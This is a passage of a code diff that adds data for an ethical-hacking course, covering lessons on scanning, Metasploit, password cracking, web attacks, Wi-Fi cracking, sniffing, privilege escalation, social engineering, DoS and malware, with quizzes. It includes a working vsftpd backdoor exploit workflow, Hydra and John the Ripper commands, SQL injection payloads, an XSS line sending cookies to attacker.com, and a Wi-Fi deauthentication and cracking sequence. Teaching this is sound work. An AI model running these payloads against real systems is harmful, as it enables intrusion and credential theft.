+                    "<p>Vulnerability scanners are automated tools that scan a target's IP addresses and report any known vulnerabilities they find. They work by checking for open ports and services, then testing those services against a massive database of known exploits and misconfigurations.</p>",
+                },
+                {
+                  title: "Leading Scanning Tools",
+                  content:
+                    '<ul><li><strong>Nessus:</strong> One of the most popular and widely recognized vulnerability scanners in the industry. It is a commercial product but has a limited free version (Nessus Essentials).</li><li><strong>OpenVAS:</strong> A powerful, open-source alternative to Nessus. It is part of the Greenbone Vulnerability Management framework and is completely free.</li></ul><div class="info-box warning"><div class="info-box-header"><i class="fas fa-exclamation-triangle"></i><strong>False Positives and Negatives</strong></div><p>Automated scanners are not perfect. They can produce <strong>false positives</strong> (reporting a vulnerability that doesn\'t exist) and <strong>false negatives</strong> (missing a vulnerability that does exist). A key skill of a penetration tester is to manually validate the results from a scanner.</p></div>',
+                  image:
+                    "https://images.unsplash.com/photo-1510915228340-29c85a43dcfe?w=800&h=400&fit=crop",
+                },
+              ],
+              codeExamples: [],
+            },
+            quiz: {
+              passingScore: 80,
+              questions: [
+                {
+                  id: 1,
+                  question:
+                    "What is the primary function of a tool like Nessus or OpenVAS?",
+                  options: [
+                    "To exploit vulnerabilities",
+                    "To automatically scan for and report known vulnerabilities",
+                    "To perform social engineering attacks",
+                    "To crack passwords",
+                  ],
+                  correct: 1,
+                  explanation:
+                    "Vulnerability scanners are designed to automate the process of checking systems against a large database of known vulnerabilities.",
+                },
+                {
+                  id: 2,
+                  question:
+                    "When a scanner reports a vulnerability that is not actually present on the system, what is this called?",
+                  options: [
+                    "A false negative",
+                    "A true positive",
+                    "A false positive",
+                    "A true negative",
+                  ],
+                  correct: 2,
+                  explanation:
+                    "A false positive is an error in which a test result incorrectly indicates the presence of a condition (such as a vulnerability) when it is not actually there.",
+                },
+                {
+                  id: 3,
+                  question:
+                    "What is a major reason for manually validating the results of an automated vulnerability scan?",
+                  options: [
+                    "The scans take too long to run",
+                    "Scanners can produce false positives and false negatives",
+                    "Scanners are too expensive",
+                    "The reports are hard to read",
+                  ],
+                  correct: 1,
+                  explanation:
+                    "The imperfection of scanners necessitates manual validation to confirm which reported vulnerabilities are real and exploitable, and to find ones the scanner may have missed.",
+                },
+              ],
+            },
+          },
+          {
+            id: "lesson-8",
+            title: "Exploitation Basics",
+            duration: "90 min",
+            objectives: [
+              "Understand common vulnerability types (e.g., buffer overflows, misconfigurations)",
+              "Learn the basic components of the Metasploit Framework",
+              "Execute a basic exploit to gain a shell",
+            ],
+            content: {
+              overview:
+                "Exploitation is the phase where you gain access. This lesson introduces the concepts behind common vulnerabilities and provides a hands-on introduction to the Metasploit Framework, the most popular exploitation tool in the world.",
+              sections: [
+                {
+                  title: "The Metasploit Framework",
+                  content:
+                    "<p>Metasploit is an incredibly powerful open-source framework for developing, testing, and executing exploit code. It simplifies the process of exploitation significantly.</p><h3>Core Components:</h3><ul><li><strong>Exploits:</strong> The code that takes advantage of a specific vulnerability.</li><li><strong>Payloads:</strong> The code that runs on the target system after the exploit is successful. A common payload is a 'shell' which gives you command-line access.</li><li><strong>Modules:</strong> Auxiliary modules for scanning, enumeration, and other tasks.</li><li><strong>Listeners:</strong> A process that waits for an incoming connection from a payload on the target machine.</li></ul>",
+                },
+                {
+                  title: "The Exploitation Process with Metasploit",
+                  content:
+                    '<p>A typical workflow in Metasploit\'s console (<code>msfconsole</code>) looks like this:</p><ol><li><strong>Search:</strong> Find an exploit for the vulnerability you identified (e.g., <code>search vsftpd 2.3.4</code>).</li><li><strong>Use:</strong> Select the exploit module (e.g., <code>use exploit/unix/ftp/vsftpd_234_backdoor</code>).</li><li><strong>Set Options:</strong> Configure the exploit\'s parameters, such as the target IP address (<code>set RHOSTS 192.168.1.101</code>).</li><li><strong>Set Payload:</strong> Choose what you want to do after gaining access (e.g., <code>set payload cmd/unix/interact</code>).</li><li><strong>Exploit:</strong> Launch the attack (<code>exploit</code> or <code>run</code>).</li></ol><div class="info-box tip"><div class="info-box-header"><i class="fas fa-lightbulb"></i><strong>Meterpreter</strong></div><p>Metasploit has an advanced payload called \'Meterpreter\' which provides a powerful, extensible shell with many built-in capabilities like file system navigation, screen capture, and privilege escalation.</p></div>',
+                  image:
+                    "https://images.unsplash.com/photo-1594723453368-04f86d16a575?w=800&h=400&fit=crop",
+                },
+              ],
+              codeExamples: [
+                {
+                  title: "Basic Metasploit (msfconsole) Workflow",
+                  language: "bash",
+                  code: "# Launch the Metasploit console\nsudo msfconsole\n\n# Search for an exploit for a vulnerable service (e.g., vsftpd 2.3.4)\nmsf6 > search vsftpd\n\n# Select the exploit module\nmsf6 > use exploit/unix/ftp/vsftpd_234_backdoor\n\n# Show the required options\nmsf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options\n\n# Set the target IP address\nmsf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 10.0.2.5\n\n# Launch the exploit\nmsf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit\n\n# If successful, you will get a command shell\n...",
+                },
+              ],
+            },
+            quiz: {
+              passingScore: 80,
+              questions: [
+                {
+                  id: 1,
+                  question: "In Metasploit, what is a 'payload'?",
+                  options: [
+                    "The code that finds a vulnerability",
+                    "The code that runs on the target system after a successful exploit",
+                    "A tool for scanning networks",
+                    "A type of report",
+                  ],
+                  correct: 1,
+                  explanation:
+                    "The payload is the code that is delivered to and executed on the target machine once the exploit has successfully compromised the service.",
+                },
+                {
+                  id: 2,
+                  question:
+                    "What is the command in `msfconsole` to launch the selected and configured exploit?",
+                  options: ["go", "attack", "pwn", "exploit"],
+                  correct: 3,
+                  explanation:
+                    "The 'exploit' or 'run' command is used to execute the module and launch the attack against the configured target.",
+                },
+                {
+                  id: 3,
+                  question: "What is Meterpreter?",
+                  options: [
+                    "A type of vulnerability scanner",
+                    "An advanced, feature-rich payload for Metasploit",
+                    "A password cracking tool",
+                    "A network sniffer",
+                  ],
+                  correct: 1,
+                  explanation:
+                    "Meterpreter is Metasploit's most powerful payload, providing an interactive shell with a wide range of post-exploitation capabilities.",
+                },
+              ],
+            },
+          },
+          {
+            id: "lesson-9",
+            title: "Password Attacks",
+            duration: "90 min",
+            objectives: [
+              "Understand different types of password attacks (brute force, dictionary, rainbow table)",
+              "Learn to use Hydra for online brute-force attacks",
+              "Learn to use John the Ripper for offline password cracking",
+            ],
+            content: {
+              overview:
+                "Weak passwords are one of the most common entry points for attackers. This lesson covers the primary methods used to crack passwords, both online (against a live service) and offline (against a captured hash).",
+              sections: [
+                {
+                  title: "Types of Password Attacks",
+                  content:
+                    "<ul><li><strong>Brute-Force Attack:</strong> Trying every possible combination of characters until the correct password is found. Very slow but will eventually succeed.</li><li><strong>Dictionary Attack:</strong> Uses a predefined list of words (a wordlist or dictionary) to try common passwords. Much faster than a brute-force attack.</li><li><strong>Rainbow Table Attack:</strong> Uses a precomputed table of password hashes to speed up the process of cracking password hashes. It's a time-memory trade-off.</li></ul>",
+                },
+                {
+                  title: "Online Attacks: Hydra",
+                  content:
+                    '<p>Hydra is a powerful and fast network logon cracker. It can perform dictionary attacks against dozens of protocols, including SSH, FTP, Telnet, and HTTP. It is considered an \'online\' attack because it tries passwords against a live, running service.</p><div class="info-box warning"><div class="info-box-header"><i class="fas fa-exclamation-triangle"></i><strong>Noisy and Risky</strong></div><p>Online brute-force attacks are very \'noisy\' and can easily trigger security alerts or lock out the account you are trying to crack. They should be used with caution.</p></div>',
+                },
+                {
+                  title: "Offline Attacks: John the Ripper",
+                  content:
+                    "<p>John the Ripper (JtR) is a fast offline password cracker. It works on captured password hashes (e.g., from a Linux <code>/etc/shadow</code> file or a database dump). Because it runs locally on the attacker's machine, it is undetectable and can try billions of passwords per second with modern hardware.</p>",
+                },
+              ],
+              codeExamples: [
+                {
+                  title: "Hydra Command (Dictionary Attack)",
+                  language: "bash",
+                  code: "# Attack an SSH server using a username and a password list\nhydra -l username -P /path/to/passwords.txt ssh://<target_ip>\n\n# Attack an FTP server with a list of users and passwords\nhydra -L /path/to/users.txt -P /path/to/passwords.txt ftp://<target_ip>",
+                },
+                {
+                  title: "John the Ripper Command (Offline Crack)",
+                  language: "bash",
+                  code: "# First, you need a file with password hashes (e.g., 'hashes.txt')\n# For Linux, you might use 'unshadow /etc/passwd /etc/shadow > hashes.txt'\n\n# Crack the hashes using the default wordlist and rules\njohn hashes.txt\n\n# Crack using a specific, larger wordlist\njohn --wordlist=/path/to/rockyou.txt hashes.txt\n\n# Show the cracked passwords\njohn --show hashes.txt",
+                },
+              ],
+            },
+            quiz: {
+              passingScore: 80,
+              questions: [
+                {
+                  id: 1,
+                  question:
+                    "An attack that tries every possible character combination is known as a...",
+                  options: [
+                    "Dictionary Attack",
+                    "Rainbow Table Attack",
+                    "Brute-Force Attack",
+                    "Phishing Attack",
+                  ],
+                  correct: 2,
+                  explanation:
+                    "A brute-force attack systematically checks all possible passwords until the correct one is found.",
+                },
+                {
+                  id: 2,
+                  question:
+                    "Which tool is best suited for performing a fast, online dictionary attack against a live SSH service?",
+                  options: ["Nmap", "Metasploit", "John the Ripper", "Hydra"],
+                  correct: 3,
+                  explanation:
+                    "Hydra is specifically designed as a network logon cracker for performing online brute-force and dictionary attacks against various services.",
+                },
+                {
+                  id: 3,
+                  question:
+                    "Why are offline password attacks with tools like John the Ripper often preferred over online attacks?",
+                  options: [
+                    "They are easier to perform",
+                    "They are undetectable by the target system",
+                    "They require less computing power",
+                    "They work on services that are offline",
+                  ],
+                  correct: 1,
+                  explanation:
+                    "Offline attacks work on a local copy of password hashes, so the target system has no knowledge of the attack, and there is no risk of account lockout.",
+                },
+              ],
+            },
+          },
+          {
+            id: "lesson-10",
+            title: "Web Application Hacking",
+            duration: "90 min",
+            objectives: [
+              "Understand the basics of SQL Injection (SQLi)",
+              "Learn about Cross-Site Scripting (XSS)",
+              "Recognize other common web vulnerabilities like CSRF and Command Injection",
+            ],
+            content: {
+              overview:
+                "Web applications are a primary target for hackers. This lesson introduces some of the most critical and common web vulnerabilities according to the OWASP Top 10.",
+              sections: [
+                {
+                  title: "SQL Injection (SQLi)",
+                  content:
+                    "<p>SQL Injection is a vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It can be used to bypass authentication, extract sensitive data, or even gain a shell on the database server.</p><p>A classic example is entering <code>' OR 1=1 --</code> into a username or password field to bypass a login.</p>",
+                },
+                {
+                  title: "Cross-Site Scripting (XSS)",
+                  content:
+                    "<p>XSS vulnerabilities allow an attacker to inject malicious client-side scripts (usually JavaScript) into web pages viewed by other users. This can be used to steal session cookies, deface websites, or redirect users to malicious sites.</p><ul><li><strong>Stored XSS:</strong> The malicious script is permanently stored on the target server (e.g., in a comment field).</li><li><strong>Reflected XSS:</strong> The script is reflected off a web server, such as in an error message or search result.</li></ul>",
+                },
+                {
+                  title: "Other Common Vulnerabilities",
+                  content:
+                    "<ul><li><strong>Cross-Site Request Forgery (CSRF):</strong> Tricks a logged-in user into performing an unwanted action (e.g., changing their password or making a purchase) without their consent.</li><li><strong>Command Injection:</strong> A vulnerability that allows an attacker to execute arbitrary operating system commands on the server running an application.</li></ul>",
+                },
+              ],
+              codeExamples: [
+                {
+                  title: "Example SQL Injection Payload",
+                  language: "sql",
+                  code: "-- Classic login bypass\n' OR 1=1 -- \n\n-- UNION-based injection to extract data\n' UNION SELECT username, password FROM users --",
+                },
+                {
+                  title: "Example XSS Payload",
+                  language: "html",
+                  code: "<!-- Simple alert box to test for XSS -->\n&lt;script&gt;alert('XSS')&lt;/script&gt;\n\n<!-- Steal a user's session cookie -->\n&lt;script&gt;document.location='http://attacker.com/cookie_stealer.php?c=' + document.cookie&lt;/script&gt;",
+                },
+              ],
+            },
+            quiz: {
+              passingScore: 80,
+              questions: [
+                {
+                  id: 1,
+                  question:
+                    "A vulnerability that allows an attacker to execute their own database queries is called...",
+                  options: [
+                    "Cross-Site Scripting",
+                    "SQL Injection",
+                    "Cross-Site Request Forgery",
+                    "Command Injection",
+                  ],
+                  correct: 1,
+                  explanation:
+                    "SQL Injection allows an attacker to manipulate the backend database queries by injecting malicious SQL code through user input fields.",
+                },
+                {
+                  id: 2,
+                  question:
+                    "Injecting \\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E into a website's comment section to see if it executes for other users is a test for what vulnerability?",
+                  options: [
+                    "SQL Injection",
+                    "Stored Cross-Site Scripting",
+                    "Reflected Cross-Site Scripting",
+                    "CSRF",
+                  ],
+                  correct: 1,
+                  explanation:
+                    "Since the script is stored on the server (in the comment) and executed for other users, this is a classic example of Stored XSS.",
+                },
+                {
+                  id: 3,
+                  question:
+                    "What is the primary goal of a Cross-Site Request Forgery (CSRF) attack?",
+                  options: [
+                    "To steal data from the database",
+                    "To execute JavaScript in other users' browsers",
+                    "To trick an authenticated user into performing an unwanted action",
+                    "To shut down the web server",
+                  ],
+                  correct: 2,
+                  explanation:
+                    "CSRF exploits the trust a site has in a user's browser, forcing them to send a forged request to perform an action on their behalf.",
+                },
+              ],
+            },
+          },
+          {
+            id: "lesson-11",
+            title: "Wireless Hacking",
+            duration: "75 min",
+            objectives: [
+              "Understand the basics of Wi-Fi security (WEP, WPA, WPA2/3)",
+              "Learn the process of capturing a WPA handshake",
+              "Recognize the threat of Evil Twin attacks",
+            ],
+            content: {
+              overview:
+                "Insecure wireless networks can be an easy entry point into a corporate or home network. This lesson covers the fundamentals of Wi-Fi hacking, focusing on common vulnerabilities and attack methods.",
+              sections: [
+                {
+                  title: "Wi-Fi Security Protocols",
+                  content:
+                    "<ul><li><strong>WEP (Wired Equivalent Privacy):</strong> An old and completely broken security protocol. It can be cracked in minutes.</li><li><strong>WPA (Wi-Fi Protected Access):</strong> An improvement over WEP, but also has known vulnerabilities (e.g., TKIP).</li><li><strong>WPA2:</strong> The former standard, using strong AES encryption. It is secure, but vulnerable to attacks on the password (if it's weak) via the handshake.</li><li><strong>WPA3:</strong> The current standard, offering much stronger protection against password guessing attacks.</li></ul>",
+                },
+                {
+                  title: "Cracking WPA/WPA2",
+                  content:
+                    "<p>The most common attack against WPA/WPA2 involves capturing the 4-way handshake that occurs when a client device connects to the access point. This handshake contains a hashed version of the password. Once captured, you can perform an offline dictionary or brute-force attack against it using tools like Aircrack-ng or Hashcat without needing to be near the network.</p>",
+                },
+                {
+                  title: "Evil Twin Attacks",
+                  content:
+                    "<p>An Evil Twin is a rogue Wi-Fi access point that appears to be a legitimate one. An attacker sets up an access point with the same name (SSID) as a real network (e.g., 'Free_Airport_WiFi'). When users connect, all their traffic passes through the attacker's device, allowing for Man-in-the-Middle attacks to steal credentials and other sensitive information.</p>",
+                },
+              ],
+              codeExamples: [
+                {
+                  title: "Aircrack-ng Suite - Conceptual Workflow",
+                  language: "bash",
+                  code: "# 1. Put your wireless card into monitor mode\nsudo airmon-ng start wlan0\n\n# 2. Discover nearby networks\nsudo airodump-ng wlan0mon\n\n# 3. Capture the handshake for a specific network\nsudo airodump-ng -c [channel] --bssid [BSSID] -w capture wlan0mon\n\n# 4. (Optional) Deauthenticate a client to force a new handshake\nsudo aireplay-ng -0 1 -a [BSSID] -c [Client MAC] wlan0mon\n\n# 5. Crack the captured handshake with a wordlist\naircrack-ng -w /path/to/wordlist.txt -b [BSSID] capture-01.cap",
+                },
+              ],
+            },
+            quiz: {
+              passingScore: 80,
+              questions: [
+                {
+                  id: 1,
+                  question:
+                    "Which Wi-Fi security protocol is considered obsolete and can be cracked in minutes?",
+                  options: ["WPA3", "WPA2", "WPA", "WEP"],
+                  correct: 3,
+                  explanation:
+                    "WEP has fundamental cryptographic flaws and should never be used. It is easily broken with modern tools.",
+                },
+                {
+                  id: 2,
+                  question:
+                    "What must an attacker capture to perform an offline brute-force attack against a WPA2 network?",
+                  options: [
+                    "The network's SSID",
+                    "The 4-way handshake",
+                    "A list of connected clients",
+                    "The router's MAC address",
+                  ],
+                  correct: 1,
+                  explanation:
+                    "The 4-way handshake is the critical exchange between a client and the access point that contains the hashed password, allowing for offline cracking attempts.",
+                },
+                {
+                  id: 3,
+                  question:
+                    "An attacker sets up a fake Wi-Fi network called 'Starbucks_Free' to steal user credentials. This is an example of what type of attack?",
+                  options: [
+                    "WPS Attack",
+                    "Evil Twin Attack",
+                    "WPA Cracking",
+                    "Deauthentication Attack",
+                  ],
+                  correct: 1,
+                  explanation:
+                    "An Evil Twin attack involves creating a rogue access point that impersonates a legitimate one to trick users into connecting.",
+                },
+              ],
+            },
+          },
+          {
+            id: "lesson-12",
+            title: "Sniffing & Spoofing",
+            duration: "75 min",
+            objectives: [
+              "Understand network sniffing and its purpose",
+              "Learn to capture and analyze traffic with Wireshark",
+              "Grasp the concept of ARP spoofing and Man-in-the-Middle (MITM) attacks",
+            ],
+            content: {
+              overview:
+                "Sniffing involves capturing, decoding, and analyzing network traffic. When combined with spoofing techniques, it can lead to powerful Man-in-the-Middle attacks, allowing an attacker to eavesdrop on or even modify communications.",
+              sections: [
+                {
+                  title: "Network Sniffing with Wireshark",
+                  content:
+                    "<p>Wireshark is the world's foremost network protocol analyzer. It allows you to capture network traffic and inspect it at a microscopic level. In a security context, it can be used to capture unencrypted data, such as usernames and passwords sent over protocols like HTTP or FTP.</p>",
+                },
+                {
+                  title: "ARP Spoofing and MITM Attacks",
+                  content:
+                    "<p>On a local network, devices use the Address Resolution Protocol (ARP) to map IP addresses to physical MAC addresses. In an <strong>ARP spoofing</strong> attack, an attacker sends forged ARP messages to associate their MAC address with the IP address of the network gateway (router). This tricks all other devices on the network into sending their traffic to the attacker's machine instead of the real gateway, placing the attacker in the 'middle' of the conversation. This is a classic <strong>Man-in-the-Middle (MITM)</strong> attack.</p>",
+                  image:
+                    "https://images.unsplash.com/photo-1614064548237-02f0d1a2a16d?w=800&h=400&fit=crop",
+                },
+              ],
+              codeExamples: [
+                {
+                  title: "Wireshark Display Filter Examples",
+                  language: "text",
+                  code: '// Filter for traffic to or from a specific IP\nip.addr == 192.168.1.50\n\n// Filter for a specific protocol (e.g., HTTP)\nhttp\n\n// Filter for HTTP POST requests (often contain login credentials)\nhttp.request.method == "POST"\n\n// Filter for DNS queries\ndns.qry.name contains "google"',
+                },
+              ],
+            },
+            quiz: {
+              passingScore: 80,
+              questions: [
+                {
+                  id: 1,
+                  question: "What is the primary purpose of Wireshark?",
+                  options: [
+                    "To launch DDoS attacks",
+                    "To crack Wi-Fi passwords",
+                    "To capture and analyze network traffic",
+                    "To scan for open ports",
+                  ],
+                  correct: 2,
+                  explanation:
+                    "Wireshark is a network protocol analyzer used to capture and inspect data traveling over a network.",
+                },
+                {
+                  id: 2,
+                  question:
+                    "ARP spoofing is a technique used to enable what type of attack?",
+                  options: [
+                    "Phishing",
+                    "Man-in-the-Middle (MITM)",
+                    "SQL Injection",
+                    "Brute-Force",
+                  ],
+                  correct: 1,
+                  explanation:
+                    "ARP spoofing tricks devices on a local network into sending their traffic to an attacker's machine, effectively placing the attacker in the middle of the communication.",
+                },
+                {
+                  id: 3,
+                  question:
+                    "Capturing passwords sent over an unencrypted HTTP login form is an example of what?",
+                  options: [
+                    "Spoofing",
+                    "Sniffing",
+                    "Exploitation",
+                    "Privilege Escalation",
+                  ],
+                  correct: 1,
+                  explanation:
+                    "Sniffing is the act of capturing and observing network traffic. If the traffic is unencrypted, sensitive data like passwords can be read in plaintext.",
+                },
+              ],
+            },
+          },
+          {
+            id: "lesson-13",
+            title: "Privilege Escalation",
+            duration: "75 min",
+            objectives: [
+              "Understand the goal of privilege escalation",
+              "Identify common misconfigurations in Linux that allow for escalation",
+              "Identify common misconfigurations in Windows that allow for escalation",
+            ],
+            content: {
+              overview:
+                "Gaining initial access is often just the first step. Most of the time, an initial shell will be as a low-privileged user. Privilege escalation is the process of exploiting a bug, design flaw, or misconfiguration to gain elevated access—typically 'root' in Linux or 'SYSTEM' in Windows.",
+              sections: [
+                {
+                  title: "Linux Privilege Escalation",
+                  content:
+                    "<p>Common vectors for escalating privileges on Linux systems include:</p><ul><li><strong>Kernel Exploits:</strong> Exploiting a vulnerability in the underlying Linux kernel itself. Often risky and can crash the system.</li><li><strong>Sudo Misconfigurations:</strong> A user may be allowed to run a specific command as root that can be abused to get a root shell (e.g., <code>sudo nmap -interactive</code>).</li><li><strong>SUID Binaries:</strong> A SUID bit on an executable means it runs with the privileges of the file owner, not the user who ran it. If a binary owned by root has the SUID bit and a vulnerability, it can be exploited.</li><li><strong>Cron Job Hijacking:</strong> If a scheduled task (cron job) running as root has weak file permissions, you may be able to modify the script it runs.</li></ul>",
+                },
+                {
+                  title: "Windows Privilege Escalation",
+                  content:
+                    "<p>Common vectors for escalating privileges on Windows systems include:</p><ul><li><strong>Missing Patches:</strong> The most common method. Many public exploits exist for vulnerabilities that are fixed by Windows updates.</li><li><strong>Unquoted Service Paths:</strong> If the path to a service executable is not enclosed in quotes and contains spaces, an attacker can place a malicious executable in a higher-level directory to be executed by the system.</li><li><strong>Insecure Service Permissions:</strong> Attackers may be able to modify a service that is running with SYSTEM privileges to execute their own code.</li><li><strong>AlwaysInstallElevated:</strong> A group policy setting that, if enabled, allows any user to install MSI packages with elevated privileges.</li></ul>",
+                },
+              ],
+              codeExamples: [
+                {
+                  title: "Linux Commands for Enumeration",
+                  language: "bash",
+                  code: "# Check what commands you can run as sudo\nsudo -l\n\n# Find SUID binaries\nfind / -type f -perm -04000 -ls 2>/dev/null\n\n# Check for writable cron jobs\nls -l /etc/cron.d/\n\n# Automated enumeration scripts like LinPEAS are highly effective\n./linpeas.sh",
+                },
+              ],
+            },
+            quiz: {
+              passingScore: 80,
+              questions: [
+                {
+                  id: 1,
+                  question: "What is the primary goal of privilege escalation?",
+                  options: [
+                    "To gain initial access to a system",
+                    "To elevate from a low-privilege user to a high-privilege user like root or SYSTEM",
+                    "To steal user passwords",
+                    "To launch a DoS attack",
+                  ],
+                  correct: 1,
+                  explanation:
+                    "Privilege escalation is the process of gaining more permissions on a system you have already compromised.",
+                },
+                {
+                  id: 2,
+                  question:
+                    "On Linux, a file with the 'SUID' bit set runs with the permissions of...",
+                  options: [
+                    "The user who executed it",
+                    "The file's owner",
+                    "The 'nobody' user",
+                    "The kernel",
+                  ],
+                  correct: 1,
+                  explanation:
+                    "The SUID bit allows an executable to run with the permissions of its owner, which is a common escalation vector if the owner is root.",
+                },
+                {
+                  id: 3,
+                  question:
+                    "A common privilege escalation vector on Windows that involves a service path containing spaces is known as...",
+                  options: [
+                    "Kernel Exploit",
+                    "Unquoted Service Path",
+                    "DLL Hijacking",
+                    "Insecure Service Permissions",
+                  ],
+                  correct: 1,
+                  explanation:
+                    "If a service path like C:\\Program Files\\Some App\\service.exe is not quoted, Windows may try to execute C:\\Program.exe, which an attacker could create.",
+                },
+              ],
+            },
+          },
+          {
+            id: "lesson-14",
+            title: "Social Engineering",
+            duration: "60 min",
+            objectives: [
+              "Understand that humans are often the weakest link in security",
+              "Recognize different types of social engineering attacks like phishing and pretexting",
+              "Learn the principles of persuasion used by attackers",
+            ],
+            content: {
+              overview:
+                "Social engineering is the art of manipulating people to give up confidential information or perform actions they shouldn't. It bypasses technical controls by exploiting human psychology, making it one of the most effective attack vectors.",
+              sections: [
+                {
+                  title: "Common Social Engineering Techniques",
+                  content:
+                    "<ul><li><strong>Phishing:</strong> Sending fraudulent emails that appear to be from legitimate sources to trick individuals into revealing sensitive information. <strong>Spear phishing</strong> targets specific individuals or groups.</li><li><strong>Pretexting:</strong> The attacker creates a fabricated scenario (a pretext) to gain the victim's trust and persuade them to provide information.</li><li><strong>Baiting:</strong> Luring a victim with a tempting offer, such as a free movie download or a USB drive labeled 'Salaries'. The bait contains malware.</li><li><strong>Quid Pro Quo:</strong> The attacker offers a benefit in exchange for information ('I can fix your computer, I just need your password').</li></ul>",
+                  image:
+                    "https://images.unsplash.com/photo-1555949963-ff98084e3304?w=800&h=400&fit=crop",
+                },
+                {
+                  title: "Principles of Influence",
+                  content:
+                    "<p>Social engineers leverage principles of human psychology to make their attacks more effective:</p><ul><li><strong>Authority:</strong> People tend to obey authority figures (e.g., pretending to be a CEO or IT support).</li><li><strong>Intimidation:</strong> Threatening negative consequences for non-compliance.</li><li><strong>Scarcity & Urgency:</strong> Creating a false sense of urgency (e.g., 'This offer expires in 5 minutes!').</li><li><strong>Familiarity/Liking:</strong> People are more likely to help someone they know or like.</li></ul>",
+                },
+              ],
+              codeExamples: [],
+            },
+            quiz: {
+              passingScore: 80,
+              questions: [
+                {
+                  id: 1,
+                  question:
+                    "An attacker sends a highly targeted email to a company's CFO pretending to be the CEO, asking for an urgent wire transfer. What is this attack called?",
+                  options: [
+                    "General Phishing",
+                    "Baiting",
+                    "Spear Phishing",
+                    "Quid Pro Quo",
+                  ],
+                  correct: 2,
+                  explanation:
+                    "Spear phishing is a type of phishing attack that is highly targeted toward a specific individual or organization.",
+                },
+                {
+                  id: 2,
+                  question:
+                    "Leaving a malware-infected USB drive labeled 'Confidential' in an office lobby is an example of which technique?",
+                  options: ["Pretexting", "Phishing", "Baiting", "Tailgating"],
+                  correct: 2,
+                  explanation:
+                    "Baiting uses a person's curiosity or greed to lure them into executing a malicious payload.",
+                },
+                {
+                  id: 3,
+                  question:
+                    "The core principle of social engineering is to exploit...",
+                  options: [
+                    "Software vulnerabilities",
+                    "Network misconfigurations",
+                    "Human psychology",
+                    "Weak encryption",
+                  ],
+                  correct: 2,
+                  explanation:
+                    "Social engineering attacks are effective because they target the human element, which is often the weakest link in the security chain.",
+                },
+              ],
+            },
+          },
+          {
+            id: "lesson-15",
+            title: "Denial of Service Attacks",
+            duration: "60 min",
+            objectives: [
+              "Differentiate between Denial of Service (DoS) and Distributed Denial of Service (DDoS)",
+              "Understand the concept of a botnet",
+              "Recognize different types of DoS attacks (e.g., volumetric, application-layer)",
+            ],
+            content: {
+              overview:
+                "A Denial of Service (DoS) attack is designed to make a machine or network resource unavailable to its intended users. This lesson explains how these attacks work and the difference between a simple DoS and a large-scale DDoS attack.",
+              sections: [
+                {
+                  title: "DoS vs. DDoS",
+                  content:
+                    "<ul><li><strong>DoS (Denial of Service):</strong> An attack launched from a <strong>single source</strong> that floods a target with traffic or sends it information that causes it to crash.</li><li><strong>DDoS (Distributed Denial of Service):</strong> An attack launched from <strong>multiple sources</strong> simultaneously. This makes it much harder to block and far more powerful.</li></ul><h3>Botnets</h3><p>DDoS attacks are typically carried out using a <strong>botnet</strong>—a network of compromised computers (bots or zombies) that are controlled by a central 'Command and Control' (C&C) server. The attacker can command the entire botnet to attack a single target.</p>",
+                },
+                {
+                  title: "Types of Attacks",
+                  content:
+                    "<ul><li><strong>Volumetric Attacks:</strong> The most common type. The goal is to consume all the available bandwidth of the target site. Examples include UDP floods and ICMP floods.</li><li><strong>Protocol Attacks:</strong> Consume server resources by exploiting weaknesses in network protocols. A SYN flood is a classic example.</li><li><strong>Application Layer Attacks:</strong> Target vulnerabilities in applications (e.g., the web server itself) to make them crash. These are harder to detect because they can look like legitimate traffic. Slowloris is an example.</li></ul>",
+                },
+              ],
+              codeExamples: [
+                {
+                  title:
+                    "LOIC (Low Orbit Ion Cannon) - For Educational Purposes Only",
+                  language: "text",
+                  code: "LOIC is a simple DoS tool that can be used to send a massive volume of TCP, UDP, or HTTP requests to a target.\n\nWARNING: Using this tool against any target without permission is illegal.",
+                },
+              ],
+            },
+            quiz: {
+              passingScore: 80,
+              questions: [
+                {
+                  id: 1,
+                  question:
+                    "What is the main difference between a DoS and a DDoS attack?",
+                  options: [
+                    "The type of traffic used",
+                    "The intent of the attacker",
+                    "The number of attack sources",
+                    "The size of the target",
+                  ],
+                  correct: 2,
+                  explanation:
+                    "A DoS attack comes from a single source, while a DDoS attack comes from many distributed sources, making it harder to defend against.",
+                },
+                {
+                  id: 2,
+                  question:
+                    "A network of thousands of compromised computers used to launch a DDoS attack is called a...",
+                  options: ["Server farm", "Botnet", "Firewall", "Honeypot"],
+                  correct: 1,
+                  explanation:
+                    "A botnet is a collection of internet-connected devices that have been hijacked by a malicious actor to be used in coordinated attacks.",
+                },
+                {
+                  id: 3,
+                  question:
+                    "An attack that aims to saturate the target's internet connection with a massive amount of traffic is what type of attack?",
+                  options: [
+                    "Application Layer Attack",
+                    "Protocol Attack",
+                    "Volumetric Attack",
+                    "Social Engineering Attack",
+                  ],
+                  correct: 2,
+                  explanation:
+                    "Volumetric attacks are designed to overwhelm the target's bandwidth, measured in bits per second (bps).",
+                },
+              ],
+            },
+          },
+          {
+            id: "lesson-16",
+            title: "Malware Basics",
+            duration: "60 min",
+            objectives: [
+              "Define and differentiate between viruses, worms, and Trojans",
+              "Understand the functionality of ransomware and spyware",
+              "Learn about Remote Access Trojans (RATs)",
+            ],
+            content: {
+              overview:
+                "Malware (malicious software) is a broad term for any software intentionally designed to cause damage to a computer, server, client, or network. This lesson breaks down the most common types of malware.",
+              sections: [
+                {
+                  title: "Key Malware Types",
+                  content:
+                    "<ul><li><strong>Virus:</strong> A piece of code that attaches itself to a legitimate program. It requires human interaction (like running the program) to spread.</li><li><strong>Worm:</strong> A standalone piece of malware that can replicate itself and spread to other computers without human interaction, often by exploiting a network vulnerability.</li><li><strong>Trojan Horse:</strong> Disguises itself as legitimate software. It doesn't replicate on its own, but it contains a malicious payload that is delivered when the user runs the program.</li></ul>",
+                },
+                {
+                  title: "Information Stealing and Destructive Malware",
+                  content:
+                    "<ul><li><strong>Ransomware:</strong> Encrypts the victim's files and demands a ransom payment (usually in cryptocurrency) in exchange for the decryption key.</li><li><strong>Spyware:</strong> Secretly gathers information about a person or organization and sends it to another entity. This can include keystroke loggers.</li><li><strong>Adware:</strong> Automatically delivers advertisements, often in a manner that is intrusive and may compromise security.</li></ul>",
+                },
+                {
+                  title: "Remote Access Trojans (RATs)",
+                  content:
